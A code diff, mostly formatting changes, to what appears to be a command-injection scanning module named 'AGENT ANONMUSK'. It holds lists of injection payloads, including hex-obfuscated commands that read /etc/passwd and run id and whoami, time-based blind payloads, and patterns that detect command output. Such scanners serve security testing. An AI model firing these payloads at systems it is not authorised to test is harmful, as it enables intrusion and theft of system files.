@@ -1,4 +1,4 @@
-﻿"""
+"""
 AGENT ANONMUSK — Command Injection Engine
 =========================================
 Tests for OS command injection with hex-style obfuscation.
@@ -31,21 +31,19 @@ CMDI_PAYLOADS = [
     f"$(echo {CANARY})",
     f"; echo {CANARY} #",
     f"| echo {CANARY} #",
-
     # Newline injection
     f"%0aecho {CANARY}",
     f"%0d%0aecho {CANARY}",
-
     # Backtick
     f"`echo {CANARY}`",
 ]
 
 # Hex-obfuscated payloads (PRD requirement: 72 6d style)
 HEX_PAYLOADS = [
-    "; $(printf '\\x65\\x63\\x68\\x6f') " + CANARY,           # echo
-    "| $(printf '\\x63\\x61\\x74') /etc/passwd",              # cat
-    "; $(printf '\\x69\\x64')",                                 # id
-    "; $(printf '\\x77\\x68\\x6f\\x61\\x6d\\x69')",           # whoami
+    "; $(printf '\\x65\\x63\\x68\\x6f') " + CANARY,  # echo
+    "| $(printf '\\x63\\x61\\x74') /etc/passwd",  # cat
+    "; $(printf '\\x69\\x64')",  # id
+    "; $(printf '\\x77\\x68\\x6f\\x61\\x6d\\x69')",  # whoami
 ]
 
 # Windows-specific payloads
@@ -62,7 +60,7 @@ TIME_PAYLOADS = [
     "; sleep {delay}",
     "| sleep {delay}",
     "|| sleep {delay}",
-    "& timeout /t {delay}",        # Windows
+    "& timeout /t {delay}",  # Windows
     "; ping -c {delay} 127.0.0.1",  # Cross-platform timing
 ]
 
@@ -92,10 +90,22 @@ class CommandInjectionEngine(BaseModule):
 
         if not target_urls:
             # Find endpoints with file/path/cmd parameters
-            cmd_keywords = ["file", "path", "cmd", "exec", "command",
-                            "run", "ping", "host", "ip", "dir", "folder"]
+            cmd_keywords = [
+                "file",
+                "path",
+                "cmd",
+                "exec",
+                "command",
+                "run",
+                "ping",
+                "host",
+                "ip",
+                "dir",
+                "folder",
+            ]
             target_urls = [
-                ep.url for ep in self.ctx.endpoints
+                ep.url
+                for ep in self.ctx.endpoints
                 if any(kw in p.lower() for p in ep.params for kw in cmd_keywords)
             ]
 
@@ -144,26 +154,20 @@ class CommandInjectionEngine(BaseModule):
             # 3. Try time-based blind
             await self._test_time_blind(client, url, param_name, blind_delay)
 
-    async def _test_inline(
-        self, client: HTTPClient, url: str, param: str
-    ) -> bool:
+    async def _test_inline(self, client: HTTPClient, url: str, param: str) -> bool:
         """Test with inline echo canary."""
         for payload in CMDI_PAYLOADS:
             test_url = self._inject_param(url, param, payload)
             try:
                 resp, evidence = await client.get(test_url)
                 if CANARY in resp.text:
-                    self._report_finding(
-                        url, param, payload, "inline", evidence
-                    )
+                    self._report_finding(url, param, payload, "inline", evidence)
                     return True
             except Exception as e:
                 logger.debug("CMD injection test failed: %s", e)
         return False
 
-    async def _test_hex(
-        self, client: HTTPClient, url: str, param: str
-    ) -> bool:
+    async def _test_hex(self, client: HTTPClient, url: str, param: str) -> bool:
         """Test with hex-obfuscated payloads."""
         for payload in HEX_PAYLOADS:
             test_url = self._inject_param(url, param, payload)
@@ -171,17 +175,13 @@ class CommandInjectionEngine(BaseModule):
                 resp, evidence = await client.get(test_url)
                 # Check for typical command output
                 if self._detect_command_output(resp.text):
-                    self._report_finding(
-                        url, param, payload, "hex-obfuscated", evidence
-                    )
+                    self._report_finding(url, param, payload, "hex-obfuscated", evidence)
                     return True
             except Exception as e:
                 logger.debug("Hex CMD test failed: %s", e)
         return False
 
-    async def _test_time_blind(
-        self, client: HTTPClient, url: str, param: str, delay: int
-    ) -> bool:
+    async def _test_time_blind(self, client: HTTPClient, url: str, param: str, delay: int) -> bool:
         """Test with time-based blind detection."""
         for payload_template in TIME_PAYLOADS:
             payload = payload_template.format(delay=delay)
@@ -193,8 +193,12 @@ class CommandInjectionEngine(BaseModule):
 
                 if elapsed >= delay * 0.8:
                     self._report_finding(
-                        url, param, payload, "time-blind",
-                        evidence, confidence=0.7,
+                        url,
+                        param,
+                        payload,
+                        "time-blind",
+                        evidence,
+                        confidence=0.7,
                     )
                     return True
             except Exception as e:
@@ -240,9 +244,9 @@ class CommandInjectionEngine(BaseModule):
     def _detect_command_output(body: str) -> bool:
         """Detect typical command output patterns."""
         patterns = [
-            re.compile(r"root:.*:0:0:", re.IGNORECASE),        # /etc/passwd
-            re.compile(r"uid=\d+\(", re.IGNORECASE),           # id command
-            re.compile(r"\\[a-zA-Z]:\\", re.IGNORECASE),       # Windows path
+            re.compile(r"root:.*:0:0:", re.IGNORECASE),  # /etc/passwd
+            re.compile(r"uid=\d+\(", re.IGNORECASE),  # id command
+            re.compile(r"\\[a-zA-Z]:\\", re.IGNORECASE),  # Windows path
             re.compile(r"www-data|apache|nginx", re.IGNORECASE),  # Linux users
         ]
         return any(p.search(body) for p in patterns)
@@ -250,6 +254,7 @@ class CommandInjectionEngine(BaseModule):
     @staticmethod
     def _inject_param(url: str, param: str, value: str) -> str:
         from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
+
         parsed = urlparse(url)
         params = parse_qs(parsed.query, keep_blank_values=True)
         params[param] = [value]
